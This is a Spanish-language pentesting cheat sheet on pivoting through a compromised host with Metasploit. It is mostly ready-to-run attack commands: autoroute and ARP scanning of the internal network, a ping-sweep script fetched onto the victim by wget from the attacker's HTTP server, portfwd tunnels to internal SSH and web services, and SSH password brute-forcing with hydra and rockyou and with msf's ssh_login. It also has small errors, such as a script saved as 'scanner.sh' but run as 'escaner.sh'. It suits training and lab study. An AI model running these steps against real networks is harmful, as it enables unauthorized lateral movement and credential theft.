# Pivoting con Metasploit

El pivoting permite atacar maquinas en una red interna a traves de una maquina intermediaria (victima comprometida).

## 1. Identificar Interfaces de Red

Desde meterpreter en la maquina intermediaria:

```bash
ipconfig
```

Identificar las interfaces: una hacia nuestra red (atacante) y otra hacia la red interna.

## 2. Enviar la Sesion a Segundo Plano

```bash
Ctrl+Z
sessions -l
```

## 3. Configurar Autoroute

Autoroute enruta el trafico de nuestra maquina atacante hacia la red interna a traves de la sesion de meterpreter.

```bash
use multi/manage/autoroute
set SESSION 1
run
```

Verificar la ruta:

```bash
route
```

## 4. Escanear la Red Interna

### Con ARP Scanner (Metasploit)

```bash
use windows/gather/arp_scanner
set SESSION 1
set RHOSTS <IP>/24
run
```

### Con Script de Bash

Ping sweep con one liner:

```shell
for i in {1..254}; do (ping -c 1 -W 1 <192.168.1>.$i | grep "bytes frome" &) ;done
```

### Con Script de Bash

Crear un script `scanner.sh` en nuestra maquina:

```bash
#!/bin/bash
for i in {1..255}; do
  timeout 1 bash -c "ping -c 1 10.10.10.$i" >/dev/null
  if [ $? -eq 0 ]; then
    echo "El host 10.10.10.$i esta activo"
  fi
done
```

Transferir a la maquina intermediaria:

```bash
python3 -m http.server 80
```

```bash
wget <IP_atacante>/scanner.sh
chmod +x scanner.sh
./escaner.sh
```

## 5. Escanear Puertos con Metasploit

```bash
use scanner/portscan/tcp
set RHOSTS <IP_objetivo_interno>
run
```

## 6. Port Forwarding

Redirige puertos de la maquina interna hacia nuestra maquina atacante.

```meterpreter
session -i 1
portfwd add -l 222 -p 22 -r <IP_maquina_interna>
```

Ahora podemos conectarnos como si el servicio estuviera en local:

```bash
ssh usuario@127.0.0.1 -p 222
```

```meterpreter
portfwd add -l 5000 -p 80 -r <IP_maquina_final>
portfwd
```

> Ahora `http://127.0.0.1:5000` muestra el servicio web de la maquina interna.

## 7. Fuerza Bruta contra Servicio Pivoteado

Fuerza Bruta a Contraseñas o Usuarios

```bash
hydra -l <usuario> -P /usr/share/wordlists/rockyou.txt ssh://127.0.0.1 -s 222
hydra -L <diccionario> -p <password> ssh://127.0.0.1 -s 222
```

Fuerza Bruta con msf6 en máquina remota:

```msf6
use scanner/ssh/ssh_login
set PASS_FILE /usr/share/wordlist/rockyou.txt
set RHOST <IP_objetivo_red_interna>
set username <root>    #nombre común
```
> Crea una nueva sesión de ssh que se puede abrir con `session -i <ID_session>`

